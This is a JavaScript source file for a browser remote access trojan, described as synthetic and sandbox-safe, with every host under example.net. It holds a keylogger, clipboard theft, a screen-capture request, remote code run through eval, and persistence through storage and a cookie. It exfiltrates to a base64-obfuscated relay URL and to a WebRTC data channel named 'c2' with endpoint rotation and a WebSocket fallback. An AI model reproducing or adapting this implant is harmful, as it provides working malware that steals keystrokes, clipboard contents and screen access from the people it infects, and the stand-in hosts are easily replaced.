// WebRTC RAT — data-channel C2, remote command dispatch, screen/clipboard
// collection and endpoint rotation with exponential backoff. Synthetic and
// sandbox-safe: no socket leaves the sandbox and every host is example.net.
(function () {
  'use strict';

  var RELAY_BLOB = 'aHR0cHM6Ly9yZWxheS5leGFtcGxlLm5ldC9yYXQvcmVwb3J0';
  var SIGNAL_ENDPOINTS = [
    'https://signal.example.net/rtc/offer',
    'https://signal2.example.net/rtc/offer',
    'https://edge.example.net/rtc/signal',
  ];
  var BACKOFF_BASE = 160;
  var MAX_ATTEMPTS = 3;
  var OFFLINE_TASKING = [
    { seq: 1, cmd: 'sysinfo' },
    { seq: 2, cmd: 'clipboard' },
    { seq: 3, cmd: 'eval', payload: "console.log('[rat] remote shell ready on data channel')" },
    { seq: 4, cmd: 'persist', payload: 'rtc:rat:persist' },
    { seq: 5, cmd: 'capture' },
  ];

  var state = { attempt: 0, endpoint: 0, channel: null, keystrokes: '', hostId: '' };

  function log(line) {
    try {
      console.log('[RTC-RAT] ' + line);
    } catch (error) {}
  }

  function relayUrl() {
    try {
      return atob(RELAY_BLOB);
    } catch (error) {
      return 'https://relay.example.net/rat/report';
    }
  }

  function postJson(url, value) {
    try {
      fetch(url, {
        method: 'POST',
        headers: { 'content-type': 'application/json' },
        body: JSON.stringify(value),
      })
        .then(function (response) {
          log('signal ' + (response && response.status ? response.status : 0));
        })
        .catch(function (error) {
          log('signal failed ' + (error && error.name ? error.name : 'network'));
        });
    } catch (error) {
      log('fetch unavailable');
    }
  }

  function encode(value) {
    try {
      return btoa(JSON.stringify(value));
    } catch (error) {
      return '';
    }
  }

  function fingerprint() {
    var material = '';
    try {
      material = navigator.userAgent + '|' + navigator.platform + '|' + screen.width + 'x' + screen.height;
    } catch (error) {}
    if (typeof crypto === 'undefined' || !crypto.subtle || typeof TextEncoder === 'undefined') return;
    try {
      crypto.subtle
        .digest('SHA-256', new TextEncoder().encode(material))
        .then(function (buffer) {
          var bytes = new Uint8Array(buffer);
          var text = '';
          for (var index = 0; index < 8; index += 1) {
            text += ('0' + bytes[index].toString(16)).slice(-2);
          }
          state.hostId = text;
          log('host fingerprint ' + text);
        })
        .catch(function () {});
    } catch (error) {}
  }

  function installKeylogger() {
    try {
      window.addEventListener('keydown', function (event) {
        var key = event && event.key ? String(event.key) : '';
        if (key.length === 1) state.keystrokes += key;
      });
      log('keyboard collector armed');
    } catch (error) {}
  }

  function renderStatus() {
    try {
      var badge = document.createElement('div');
      badge.id = 'rtc-rat-status';
      badge.hidden = true;
      badge.textContent = 'media session active';
      document.body.appendChild(badge);
    } catch (error) {}
  }

  function sysinfo() {
    var info = {
      host: state.hostId,
      ua: '',
      platform: '',
      cores: 0,
      screen: '',
      keys: state.keystrokes.length,
      stored: 0,
    };
    try {
      info.ua = navigator.userAgent;
      info.platform = navigator.platform;
      info.cores = navigator.hardwareConcurrency;
      info.screen = screen.width + 'x' + screen.height;
      info.stored = localStorage.length + sessionStorage.length;
    } catch (error) {}
    return info;
  }

  function sendResult(channel, kind, data) {
    var packet = { kind: kind, host: state.hostId, data: data, ts: Date.now() };
    var body = encode(packet);
    if (channel && typeof channel.send === 'function') {
      try {
        channel.send(body);
      } catch (error) {}
    }
    postJson(relayUrl(), { transport: 'webrtc', packet: body });
  }

  function handleCommand(channel, task) {
    log('task ' + task.seq + ' ' + task.cmd);
    switch (task.cmd) {
      case 'sysinfo':
        sendResult(channel, 'sysinfo', sysinfo());
        return;
      case 'clipboard':
        try {
          navigator.clipboard
            .readText()
            .then(function (text) {
              sendResult(channel, 'clipboard', String(text || '').slice(0, 512));
            })
            .catch(function () {
              sendResult(channel, 'clipboard', 'denied');
            });
        } catch (error) {
          sendResult(channel, 'clipboard', 'unavailable');
        }
        return;
      case 'eval':
        try {
          eval(String(task.payload || ''));
          sendResult(channel, 'eval', 'ok');
        } catch (error) {
          sendResult(channel, 'eval', String(error && error.message));
        }
        return;
      case 'persist':
        try {
          localStorage.setItem(String(task.payload || 'rtc:rat:persist'), '1');
          sessionStorage.setItem('rtc:rat:session', state.hostId || 'unknown');
          sendResult(channel, 'persist', 'stored');
        } catch (error) {
          sendResult(channel, 'persist', 'denied');
        }
        return;
      case 'capture':
        try {
          navigator.mediaDevices
            .getDisplayMedia({ video: true })
            .then(function () {
              sendResult(channel, 'capture', 'stream');
            })
            .catch(function () {
              sendResult(channel, 'capture', 'permission-denied');
            });
        } catch (error) {
          sendResult(channel, 'capture', 'unsupported');
        }
        return;
      default:
        sendResult(channel, 'unknown', task.cmd);
    }
  }

  function deliverTasking(channel) {
    for (var index = 0; index < OFFLINE_TASKING.length; index += 1) {
      (function (task, delay) {
        setTimeout(function () {
          if (typeof channel.onmessage === 'function') {
            channel.onmessage({ data: JSON.stringify(task) });
          }
        }, delay);
      })(OFFLINE_TASKING[index], 60 + index * 40);
    }
    setTimeout(function () {
      sendResult(channel, 'heartbeat', { uptime: Date.now(), seq: OFFLINE_TASKING.length });
      if (state.attempt < MAX_ATTEMPTS - 1) simulateTransportError();
    }, 60 + OFFLINE_TASKING.length * 40 + 80);
  }

  function simulateTransportError() {
    log('ice failure on ' + SIGNAL_ENDPOINTS[state.endpoint % SIGNAL_ENDPOINTS.length]);
    if (state.channel && typeof state.channel.close === 'function') {
      try {
        state.channel.close();
      } catch (error) {}
    }
    state.channel = null;
    scheduleReconnect();
  }

  function scheduleReconnect() {
    var attempt = state.attempt + 1;
    if (attempt >= MAX_ATTEMPTS) {
      log('reconnect budget exhausted');
      return;
    }
    state.attempt = attempt;
    var delay = Math.floor(BACKOFF_BASE * Math.pow(2, attempt));
    log('reconnect attempt ' + attempt + ' in ' + delay + 'ms');
    setTimeout(function () {
      connect(true);
    }, delay);
  }

  function connect(isRetry) {
    state.endpoint += 1;
    var endpoint = SIGNAL_ENDPOINTS[state.endpoint % SIGNAL_ENDPOINTS.length];
    if (typeof RTCPeerConnection !== 'function') {
      connectWebSocket(endpoint);
      return;
    }
    var peer;
    try {
      peer = new RTCPeerConnection({
        iceServers: [{ urls: 'stun:stun.example.net:3478' }],
      });
    } catch (error) {
      log('rtc unavailable: ' + String(error && error.message));
      return;
    }
    var channel;
    try {
      channel = peer.createDataChannel('c2', { ordered: true });
    } catch (error) {
      log('data channel failed');
      return;
    }
    state.channel = channel;
    channel.onopen = function () {
      log('data channel open');
    };
    channel.onmessage = function (event) {
      var task = null;
      try {
        task = JSON.parse(String(event && event.data ? event.data : '{}'));
      } catch (error) {
        return;
      }
      handleCommand(channel, task);
    };
    channel.onclose = function () {
      log('data channel closed');
    };
    try {
      peer
        .createOffer()
        .then(function (offer) {
          return peer.setLocalDescription(offer).then(function () {
            return offer;
          });
        })
        .then(function (offer) {
          postJson(endpoint, {
            type: 'offer',
            sdp: String(offer && offer.sdp ? offer.sdp.slice(0, 220) : ''),
            host: state.hostId,
          });
        })
        .catch(function (error) {
          log('offer failed ' + String(error && error.message));
        });
    } catch (error) {
      log('signalling failed');
    }
    if (!isRetry) deliverTasking(channel);
  }

  function connectWebSocket(endpoint) {
    log('rtc missing, websocket fallback');
    try {
      var socket = new WebSocket(endpoint.replace('https://', 'wss://'));
      socket.onopen = function () {
        try {
          socket.send(encode({ hello: state.hostId, transport: 'ws-fallback' }));
        } catch (error) {}
      };
      state.channel = {
        send: function (body) {
          try {
            socket.send(body);
          } catch (error) {}
        },
      };
      postJson(endpoint, { type: 'fallback', host: state.hostId });
    } catch (error) {
      log('websocket fallback failed');
    }
  }

  function main() {
    log('starting implant attempt=' + state.attempt);
    fingerprint();
    installKeylogger();
    renderStatus();
    try {
      document.cookie = 'rtc_rat=' + (state.hostId || 'pending') + '; path=/';
    } catch (error) {}
    connect(false);
  }

  try {
    main();
  } catch (error) {
    log('stage aborted ' + String(error && error.message));
  }
})();
